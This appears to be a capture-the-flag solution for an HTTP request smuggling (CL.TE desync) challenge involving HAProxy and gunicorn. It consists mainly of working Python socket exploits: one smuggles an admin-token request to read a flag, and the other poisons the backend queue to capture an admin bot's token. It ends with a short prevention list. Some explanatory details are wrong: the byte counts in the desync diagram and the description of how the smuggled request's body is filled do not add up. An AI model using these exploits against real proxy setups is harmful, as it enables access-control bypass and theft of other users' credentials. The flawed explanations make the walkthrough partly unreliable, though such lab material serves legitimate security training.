# Solution: HTTP Request Smuggling (web-http-desync)

## Vulnerability: CL.TE Desync

**Setup**: HAProxy (frontend) + gunicorn (backend)

The desync occurs because:
- **HAProxy** reads `Content-Length` to determine where the request body ends
- **gunicorn** prefers `Transfer-Encoding: chunked` when both headers are present
- HAProxy uses `http-server-close` (not `http-tunnel`), keeping backend connections alive

When a request has both `Content-Length: N` and `Transfer-Encoding: chunked`:
- HAProxy forwards exactly N bytes to gunicorn
- gunicorn parses as chunked, reads until `0\r\n\r\n`, then STOPS
- The leftover bytes become the beginning of the NEXT request on that connection

## Exploit: Inject Admin Token

### Method 1: Direct token injection (simplest)

The token value `secret-admin-token-xyz` is hinted in the challenge description.
If you already know it (or deduce it), smuggle directly:

```python
import socket

HOST = "<TARGET_IP>"
PORT = 8080

# The smuggled suffix starts a new request with the admin token
smuggled_suffix = (
    "GET /admin/flag HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "X-Admin-Token: secret-admin-token-xyz\r\n"
    "Content-Length: 5\r\n"
    "\r\n"
    "dummy"
)

# Body that HAProxy reads as complete (CL=len), but gunicorn reads as chunked ending at "0\r\n\r\n"
# Leftover after "0\r\n\r\n" is the smuggled_suffix
body = f"0\r\n\r\n{smuggled_suffix}"
cl = len(body)

request = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Content-Length: {cl}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{body}"
)

# Follow immediately with the "normal" request (serves as the body for the smuggled request)
normal_request = (
    f"GET /debug/headers HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

s = socket.socket()
s.connect((HOST, PORT))
s.settimeout(10)
s.sendall(request.encode() + normal_request.encode())

responses = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        responses += chunk
except socket.timeout:
    pass
s.close()

print(responses.decode(errors="replace"))
```

### Method 2: Capture admin bot's request (steal token)

This approach poisons the queue so the admin bot's next request
(which includes `X-Admin-Token`) gets stored in `/capture`:

```python
import socket, time

HOST = "<TARGET_IP>"
PORT = 8080

# Smuggled prefix: a partial POST /capture request
# The admin bot's full request becomes the body of this POST
smuggled_prefix = (
    "POST /capture HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 200\r\n"  # Large enough to capture admin bot headers
    "\r\n"
)

body = f"0\r\n\r\n{smuggled_prefix}"
cl = len(body)

smuggle_req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Content-Length: {cl}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{body}"
)

# Send the smuggling request
s = socket.socket()
s.connect((HOST, PORT))
s.settimeout(5)
s.sendall(smuggle_req.encode())
try:
    s.recv(4096)
except:
    pass
s.close()

# Wait for admin bot to make its request (within 10 seconds)
time.sleep(12)

# Check captured requests
import urllib.request, json
resp = urllib.request.urlopen(f"http://{HOST}:{PORT}/capture/log")
data = json.loads(resp.read())
print(json.dumps(data, indent=2))
# Look for X-Admin-Token in captured headers/body
```

### Method 3: Direct request with known token

Once the token is known (from capture or from source):

```bash
curl -s http://<TARGET_IP>:8080/admin/flag \
  -H "X-Admin-Token: secret-admin-token-xyz"
```

Response:
```json
{
  "status": "authorized",
  "flag": "HL4{...}",
  "message": "Access granted to admin vault"
}
```

## Understanding the Desync in Detail

```
HAProxy receives:
  POST / HTTP/1.1
  Content-Length: 47          <- HAProxy uses this: forwards 47 bytes
  Transfer-Encoding: chunked
  
  0\r\n                       <- chunk size 0 = end (13 bytes)
  \r\n                        <- end of chunks (2 bytes)
  GET /admin/flag...          <- remaining 32 bytes = part of "body" to HAProxy

Gunicorn receives from HAProxy:
  POST / HTTP/1.1
  Content-Length: 47
  Transfer-Encoding: chunked  <- Gunicorn prefers TE
  
  0\r\n\r\n                   <- gunicorn: "body done, POST complete"

Leftover in gunicorn's buffer (still on same TCP connection):
  GET /admin/flag HTTP/1.1
  X-Admin-Token: secret-admin-token-xyz
  ...                         <- treated as START of NEXT request
```

## Verification

Run `smuggler.py` from the `smuggler` tool:
```bash
pip install requests
python smuggler.py -u http://<TARGET_IP>:8080/ -m POST
```

Or use Burp Suite's HTTP Request Smuggler extension.

## Prevention
- Use `option http-buffer-request` and `option http-server-close` carefully
- Normalize headers: reject requests with both CL and TE
- Use HTTP/2 end-to-end (no CL/TE ambiguity)
- HAProxy config: add `http-request reject if { req.hdr_cnt(transfer-encoding) gt 0 }`
